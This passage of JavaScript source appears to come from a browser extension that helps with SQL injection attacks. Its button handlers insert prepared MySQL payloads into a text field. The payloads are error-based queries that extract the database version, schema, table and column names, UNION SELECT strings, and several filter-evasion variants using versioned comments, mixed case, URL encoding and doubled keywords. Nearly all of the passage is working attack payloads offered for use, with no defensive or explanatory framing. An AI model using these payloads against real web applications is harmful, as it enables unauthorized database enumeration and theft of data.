				{
					final1 += '+AND(SELECT+1+FROM(SELECT+COUNT(*),CONCAT((SELECT+(SELECT+CONCAT(CAST(VERSION()+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1=1';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#dbsdbs').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '+AND(SELECT+1+from(SELECT+COUNT(*),CONCAT((SELECT+(SELECT+(SELECT+DISTINCT+CONCAT(0x7e,0x27,CAST(schema_name+AS+CHAR),0x27,0x7e)+FROM+INFORMATION_SCHEMA.SCHEMATA+WHERE+table_schema!=DATABASE()+LIMIT+1,1))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),+FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1=1';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#dbsgtbl').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '+AND(SELECT+1+from(SELECT+COUNT(*),CONCAT((SELECT+(SELECT+(SELECT+DISTINCT+CONCAT(0x7e,0x27,CAST(table_name+AS+CHAR),0x27,0x7e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=DATABASE()+LIMIT+0,1))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1=1';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#dbsgtcl').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '+AND(SELECT+1+FROM(SELECT+COUNT(*),CONCAT((SELECT+(SELECT+(SELECT+DISTINCT+CONCAT(0x7e,0x27,CAST(column_name+AS+CHAR),0x27,0x7e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_schema=DATABASE()+AND+table_name=ENTER_TABLE_NAME_HEX+LIMIT+0,1))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1=1';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#dbsdta').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '+AND(SELECT+1+FROM(SELECT+count(*),CONCAT((SELECT+(SELECT+(SELECT+CONCAT(0x7e,0x27,cast(ENTER_COLUMN_NAME+AS+CHAR),0x27,0x7e)+FROM+ENTER_TABLE_NAME+LIMIT+0,1))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1=1';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

	$('#ordrp1').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '+/*!50000ORDER*/+BY+';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#ordrp2').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '+/*!50000ORDER*/+/*!50000BY*/+';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#ordrp3').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '+/*!50000ORDER*//**//*!50000BY*/+';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#ordrp4').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '+/*!50000ORDER BY*/+';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#ordrp5').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += ' /*!order*/+/*!by*/ ';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#unon1').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '+/*!50000UNION*/+ALL+SELECT+';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#unon2').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '+/*!50000UNION*/+/*!50000ALL*/+/*!50000SELECT*/+';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#unon3').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '+/*!50000UNION*/+/*!50000SELECT*/+';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#unon4').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += ' /*!50000%55nIoN*/ /*!50000%53eLeCt*/ ';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#unon5').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '+union+distinctROW+select+';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#unon6').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '+union+distinct+select+';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#unon7').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += ' /*!50000UniON SeLeCt*/ ';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#unon8').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '+%0AUnIOn%23xyz%0ASeLecT+';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#unon9').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '+/*!blobblobblob%0d%0aunion*/+/*!blobblobblob%0d%0aSelEct*/+';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#unon10').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '+UNunionION+SEselectLECT+';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#dtbss1').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(SELECT+/*!50000GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)*/+/*!50000FROM*/+/*!50000INFORMATION_SCHEMA*/.SCHEMATA)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#dtbss2').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(SELECT+(@x)+FROM+(SELECT+(@x:=0x00),(@NR_DB:=0),(SELECT+(0)+FROM+(INFORMATION_SCHEMA.SCHEMATA)+WHERE+(@x)+IN+(@x:=CONCAT(@x,LPAD(@NR_DB:=@NR_DB%2b1,2,0x30),0x20203a2020,schema_name,0x3c62723e))))x)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#dtbss3').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += "(select group_Concat(0x3c62723e,table_schema) from {f information_schema.tables} where table_name = 'admin')";
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#dtbss4').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += "(select /*!50000group_Concat(*/table_schema) from {f information_schema.tables} where table_name = 'admin')";
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#dtbss5').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(SELECT+(@x)+/*!50000FROM*/+(SELECT+(@x:=0x00),(@NR_DB:=0),(SELECT+(0)+/*!50000FROM*/+(/*!50000INFORMATION_SCHEMA*/.SCHEMATA)+/*!50000WHERE*/+(@x)+IN+(@x:=/*!50000CONCAT(@x,LPAD(@NR_DB:=@NR_DB%2b1,2,0x30)*/,0x20203a2020,schema_name,0x3c62723e))))x)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
	$('#tblsm1').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(SELECT+/*!50000GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)*/+/*!50000FROM*/+/*!50000INFORMATION_SCHEMA*/.TABLES+WHERE+TABLE_SCHEMA=DATABASE())';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
		
	$('#tblsm2').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(SELECT+/*!50000GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)*/+/*!5000froM*/+/*!5000InfORmaTion_scHema*/.tAblES+/*!5000WhERe*/+/*!5000TaBle_ScHEmA*/=schEMA())';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
		
	$('#tblsm3').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(SELECT+/*!50000GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)*/+/*!5000froM*/+/*!5000InfORmaTion_scHema*/.tAblES /*!5000WhERe*/+/*!5000TaBle_ScHEmA*/+like schEMA())';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
		
	$('#tblsm4').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(SELECT+/*!50000GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)*/+/*!5000froM*/+/*!5000InfORmaTion_scHema*/.tAblES /*!5000WhERe*/+/*!5000TaBle_ScHEmA*/=database())';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
		
	$('#tblsm5').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(SELECT+/*!50000GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)*/+/*!5000froM*/+/*!5000InfORmaTion_scHema*/.tAblES /*!5000WhERe*/+/*!5000TaBle_ScHEmA*/+like+database())';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
		
	$('#clmssm1').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '(SELECT+/*!50000GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)*/+/*!50000FROM*/+/*!50000INFORMATION_SCHEMA*/.COLUMNS+WHERE+TABLE_NAME=HEX_TABLE_NAME)';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	
		
	$('#clmssm2').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += "(SELECT+/*!50000GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)*/+/*!50000FROM*/+/*!50000INFORMATION_SCHEMA*/.COLUMNS+WHERE+TABLE_NAME='TABLE_NAME_HERE')";
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

